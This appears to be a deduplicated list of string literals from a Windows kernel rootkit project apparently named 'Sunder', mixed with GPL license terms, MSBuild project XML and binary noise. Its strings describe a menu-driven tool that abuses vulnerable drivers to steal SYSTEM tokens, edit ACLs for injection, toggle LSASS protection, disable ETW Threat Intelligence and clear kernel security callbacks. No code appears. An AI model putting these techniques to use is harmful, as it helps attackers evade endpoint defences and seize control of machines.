""" Condition="
""" Label="
""" encoding="
""" group (S-1-5-11)\n"
""" is either (1) a "
""" xmlns="
"""!F"
""""""
"""$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props"
"""$(VCTargetsPath)\Microsoft.Cpp.Default.props"
"""$(VCTargetsPath)\Microsoft.Cpp.props"
"""$(VCTargetsPath)\Microsoft.Cpp.targets"
"""$Jm{"
"""%Q"
"""'$(Configuration)|$(Platform)'=='Debug|Win32'"
"""'$(Configuration)|$(Platform)'=='Debug|x64'"
"""'$(Configuration)|$(Platform)'=='Release|Win32'"
"""'$(Configuration)|$(Platform)'=='Release|x64'"
"""($P0Q"
""") = "
"""), "
"""*z"
""", "
""", L"
""",_eH=^:Fvw"
"""-#X\f4-hCi"
""".  "
""".Bi`%"
"""/>"
"""1.0"
"""2"
"""7-Z6Id,+"
"""9+ !B/"
""";D"
"""AC:`u:"
"""AS IS"
"""Additional permissions"
"""Appropriate Legal Notices"
"""Authenticated Users\"
"""Build"
"""C:\\Temp51231"
"""C:\\Windows\\System32\\ntoskrnl.exe"
"""CP{<67"
"""Configuration"
"""Copyright"
"""Corresponding Source"
"""Debug|Win32"
"""Debug|x64"
"""Enter PS_PROTECTION type [number]: "
"""Enter payload [number]: "
"""Enter target PID: "
"""ExtensionSettings"
"""ExtensionTargets"
"""G-MC"
"""Globals"
"""H"
"""Hacs"
"""Hn"
"""Hw>F9"
"""ImLX"
"""Installation Information"
"""KeInsertQueueApc"
"""Knowingly relying"
"""Licensees"
"""LocalAppDataPlatform"
"""Major Component"
"""Mby^	"
"""NT AUTHORITY\\LOCAL SERVICE"
"""NT AUTHORITY\\SYSTEM"
"""NtQuerySystemInformation"
"""NtWriteVirtualMemory"
"""Object code"
"""P=h<	"
"""PAGE"
"""ProjectConfigurations"
"""PropertySheets"
"""PsInitialSystemProcess"
"""PsSetCreateProcessNotifyRoutine"
"""PsSetCreateThreadNotifyRoutine"
"""PsSetLoadImageNotifyRoutine"
"""R,ud8Q:2"
"""Release|Win32"
"""Release|x64"
"""Rn<"
"""SeDebugPrivilege"
"""Shared"
"""Standard Interface"
"""Sunder"
"""Sunder-appid"
"""Sunder-appid\Sunder-appid.vcxproj"
"""Sunder.cpp"
"""Sunder\Sunder.vcxproj"
"""System Libraries"
"""The Program"
"""This License"
"""User Product"
"""UserMacros"
"""X"
"""[!] Default (off)\n"
"""[!] Disabling PPL on target process (Disabling PPL on LSASS in Windows 11 causes a reboot if not restored within a minute)\n"
"""[!] ETW IsEnabled byte addr may be wrong, ETW_GUID_ENTRY->TRACE_ENABLE_INFO is %llx\n"
"""[!] It is possible to set privilege fields to -1 to gain all privileges, but it will look anomalous\n"
"""[!] Note the ACL offset is only confirmed valid for winlogon.exe, other processes may be different\n"
"""[!] Note: A BSOD is likely if the target process closes while the token is in use\n"
"""[*] Adding %llx offset, EtwThreatIntProvRegHandle is: %llx\n"
"""[*] Adding %x offset, PsSetLoadImageNotifyRoutineEx is: %llx\n"
"""[*] Adding %x offset, PspSetCreateProcessNotifyRoutine is: %llx\n"
"""[*] Adding %x offset, PspSetCreateThreadNotifyRoutine is: %llx\n"
"""[*] All DLL image load callbacks cleared!\n"
"""[*] All process callbacks cleared!\n"
"""[*] All thread callbacks cleared!\n"
"""[*] Base address of ntoskrnl.exe: 0x%llx\n"
"""[*] Base address of ntoskrnl: 0x%llx\n"
"""[*] Calling IOCTL to exploit callback overwrite with nt!ExpProfileDelete\n"
"""[*] Current token user: %s\n"
"""[*] Editing ACL to allow access to target PID: %d\n"
"""[*] Elevating to SYSTEM token\n"
"""[*] Escalating privileges for target PID: %d\n"
"""[*] Exiting\n"
"""[*] Kernel pointer to KeInsertQueueApc: %llx\n"
"""[*] Kernel pointer to KeInsertQueueApc: 0x%llx\n"
"""[*] Kernel pointer to PsInitialSystemProcess: 0x%llx\n"
"""[*] Kernel pointer to PsSetCreateProcessNotifyRoutine: %llx\n"
"""[*] Kernel pointer to PsSetCreateProcessNotifyRoutine: 0x%llx\n"
"""[*] Kernel pointer to PsSetCreateThreadNotifyRoutine: %llx\n"
"""[*] Kernel pointer to PsSetCreateThreadNotifyRoutine: 0x%llx\n"
"""[*] Kernel pointer to PsSetLoadImageNotifyRoutine: %llx\n"
"""[*] Kernel pointer to PsSetLoadImageNotifyRoutine: 0x%llx\n"
"""[*] Kernel pointer to SYSTEM process: %llx\n"
"""[*] Not running as NT AUTHORITY\\LOCAL SERVICE\n"
"""[*] Opened file handle: 0x%x\n"
"""[*] Opened thread handle to self: 0x%x\n"
"""[*] Restored previous mode to user mode. Cleaning up and exiting\n"
"""[*] Stealing target process token and starting cmd.exe\n"
"""[*] Stealing token from target PID: %x\n"
"""[*] Targeting self\n"
"""[+] Current process found at: %llx\n"
"""[+] ETW_REG_ENTRY located at %llx\n"
"""[+] First DLL image load callback at: %llx\n"
"""[+] First process creation callback at: %llx\n"
"""[+] First thread creation callback at: %llx\n"
"""[+] Found kernel mode address of nt!ExpProfileDelete: 0x%llx\n"
"""[+] Found likely jump offset at: %llx, value %llx\n"
"""[+] Impersonated NT AUTHORITY\\LOCAL SERVICE\n"
"""[+] Impersonated NT AUTHORITY\\SYSTEM\n"
"""[+] Leaked KTHREAD for current process: 0x%llx\n"
"""[+] Leaked kernel file object: 0x%llx\n"
"""[+] Loaded ntoskrnl at 0x%llx\n"
"""[+] NULLing callback at %llx, with value %llx\n"
"""[+] Obtained driver handle: 0x%llx\n"
"""[+] Obtained token for %s from PID %d\n"
"""[+] Opened full access handle 0x%x to PID: %d\n"
"""[+] Opened handle to appid.sys driver\n"
"""[+] Previous mode has been set to kernel mode. RW primitives active\n"
"""[+] Reading Security Descriptor to find ACL address\n"
"""[+] Reading isenabled byte from etwGuidEntry+0x80 (%llx + 0x80)\n"
"""[+] SeDebugPrivilege enabled\n"
"""[+] Setting ETW IsEnabled byte to 0x0\n"
"""[+] Setting MandatoryPolicy byte at %llx to 0\n"
"""[+] Setting SEP_AUDIT_POLICY to 0x%llx, previous mask: 0x%llx\n"
"""[+] Setting SEP_TOKEN_PRIVILEGES to 0x%llx, previous privilege mask: 0x%llx\n"
"""[+] Target process found at: %llx\n"
"""[+] Updating ACL at %llx to give access to \"
"""[-] AdjustTokenPrivileges Failed With Error: %d \n"
"""[-] Allocating memory for input buffer failed\n"
"""[-] Allocating memory for output buffer failed\n"
"""[-] Calling IOCTL failed: 0x%lx\n"
"""[-] Could not find KeInsertQueueApc in ntoskrnl\n"
"""[-] Could not find PsInitialSystemProcess in ntoskrnl\n"
"""[-] Could not find PsSetCreateProcessNotifyRoutine in ntoskrnl\n"
"""[-] Could not find PsSetCreateThreadNotifyRoutine in ntoskrnl\n"
"""[-] Could not find PsSetLoadImageNotifyRoutine in ntoskrnl\n"
"""[-] Could not find offset to EtwThreatIntProvRegHandle within 50 instructions, exiting\n"
"""[-] Could not find offset to PsSetLoadImageNotifyRoutineEx within 50 instructions, exiting\n"
"""[-] Could not find offset to PspSetCreateProcessNotifyRoutine within 50 instructions, exiting\n"
"""[-] Could not find offset to PspSetCreateThreadNotifyRoutine within 50 instructions, exiting\n"
"""[-] Could not find offset to process creation callbacks within 150 instructions, exiting\n"
"""[-] Could not find offset to thread creation callbacks within 150 instructions, exiting\n"
"""[-] Could not find target PS_PROTECTION struct in kernel.\n"
"""[-] Could not find target process in kernel.\n"
"""[-] Could not find tokens in kernel. Current process: %llx  Target process: %llx\n"
"""[-] Could not obtain handle to Appid.sys with token, trying again\n"
"""[-] Could not resolve nt!ExpProfileDelete in usermode\n"
"""[-] Could not retrieve base addr of ntoskrnl\n"
"""[-] EnumDeviceDrivers failed with error: 0x%lx\n"
"""[-] Error loading ntoskrnl: 0x%lx\n"
"""[-] Error obtaining driver handle: 0x%lx\n"
"""[-] Error while calling ReadProcessMemory(): %d\n"
"""[-] Error while loading ntoskrnl: %d\n"
"""[-] Failed to create temporary file: %ls\n"
"""[-] Failed to obtain process token\n"
"""[-] Failed to set previous mode\n"
"""[-] Failed to steal LOCAL SERVICE token, exiting\n"
"""[-] Failed to steal SYSTEM token, exiting\n"
"""[-] GetProcAddress failed\n"
"""[-] GetTokenInformation failed with error: 0x%x\n"
"""[-] ImpersonateLoggedOnUser Failed with Error: %lx\n"
"""[-] LocalAlloc [%d] Failed With Error: %d \n"
"""[-] LookupAccountSidW Failed With Error: %d\n"
"""[-] LookupPrivilegeValueW Failed With Error: %d \n"
"""[-] Not All Privileges Referenced Are Assigned To The Caller \n"
"""[-] NtQuerySystemInformation failed with error code 0x%X\n"
"""[-] NtWriteVirtualMemory failed with status 0x%x\n"
"""[-] OpenProcess PID %d Failed with Error: %lx\n"
"""[-] OpenProcess targeting PID %d has failed\n"
"""[-] OpenProcessToken Failed With Error: 0x%0.8X \n"
"""[-] OpenProcessToken PID %d Failed with Error: 0x%lx\n"
"""[-] OpenThread to self failed\n"
"""[-] Unable to find RVA of ExpProfileDelete function\n"
"""[0] Token Stealing\n"
"""[1] Authenticode\n"
"""[1] Token Escalation\n"
"""[2] ACL Editing\n"
"""[2] CodeGen\n"
"""[3] Antimalware\n"
"""[3] Enable/Disable PPL on a process\n"
"""[4] Disable ETWti\n"
"""[4] LSA\n"
"""[5] Clear process callbacks\n"
"""[5] Windows\n"
"""[6] Clear thread callbacks\n"
"""[6] WinTcb\n"
"""[7] Clear DLL load callbacks\n"
"""[7] Max\n"
"""[DEBUG] Adding offset %x and jump %llx to address %llx\n"
"""[DEBUG] Hitting breakpoint\n"
"""[DEBUG] Starting address of ExpProfileDelete: 0x%llx\n"
"""[DEBUG] current: %llx from offset +0x%x\n"
"""[DEBUG] rkStruct->KeInsertQueueApc:	0x%llx\n"
"""[DEBUG] rkStruct->PsSetCreateProcessNotifyRoutine: 0x%llx\n"
"""[DEBUG] rkStruct->PsSetCreateThreadNotifyRoutine: 0x%llx\n"
"""[DEBUG] rkStruct->PsSetLoadImageNotifyRoutine: 0x%llx\n"
"""[DEBUG] rkStruct->myProcessId: 0x%x\n"
"""[DEBUG] rkStruct->readprimitive: 0x%p\n"
"""[DEBUG] rkStruct->systemEprocess: 0x%llx\n"
"""[DEBUG] rkStruct->vulnDriver: 0x%x\n"
"""[DEBUG] rkStruct->writeprimitive: 0x%p\n"
"""[EVASION] Clearing kernel callbacks for image loads\n"
"""[EVASION] Clearing kernel callbacks for process creation\n"
"""[EVASION] Clearing kernel callbacks for thread creation\n"
"""[EVASION] Disabling ETW Threat Intel (function hooking in kernel)\n"
"""[EVASION] Enabling PPL for PID %d\n"
"""[INJECTION] Editing ACL to inject into PID %d\n"
"""[Op"
"""[PRIVESC] Giving token full privileges for PID %d\n"
"""[PRIVESC] Stealing token from PID %d\n"
"""[Q] Quit (clean up and exit)\n"
"""\\\\.\\AppID"
"""\\\\.\\DBUtil_2_3"
"""\n"
"""\nChoose payload:\n"
"""\nPPL Protection Signers:\n"
"""\n[+] Setting protection level to %llx\n"
"""\n[-] Invalid PID format\n"
"""]o"
"""_"
"""`"
"""`a"
"""aX"
"""about box"
"""aggregate"
"""b,.m"
"""based on"
"""br}"
"""consumer product"
"""contributor version"
"""contributor"
"""control"
"""convey"
"""copyright disclaimer"
"""copyright"
"""covered work"
"""d"
"""discriminatory"
"""dr"
"""entity transaction"
"""essential patent claims"
"""exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')"
"""g"
"""gpDk"
"""grant"
"""hB"
"""http://schemas.microsoft.com/developer/msbuild/2003"
"""keep intact all notices"
"""kr"
"""modified version"
"""modify"
"""n=4=Gp"
"""n=eg^<5]"
"""nk=K'"
"""normally used"
"""ntdll"
"""ntdll.dll"
"""ntoskrnl.exe"
"""ob,k$"
"""or any later version"
"""patent license"
"""propagate"
"""recipients"
"""rktools.cpp"
"""rktools.h"
"""source code"
"""start cmd.exe"
"""start cmd.exe\n"
"""structs.h"
"""sunder.cpp"
"""svchost.exe"
"""t"
"""utf-8"
"""winlogon.exe"
"""x"
"""xi"
"""you"
"""y{4FGW_"
"""z"
"""{5A958C89-6327-401C-A214-C89E54855B57}"
"""{643AD690-5C85-4B12-AF42-2D31D11657A1}"
"""{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}"
"""|biDua7\4G("
"""}6g(+G"
"""~"
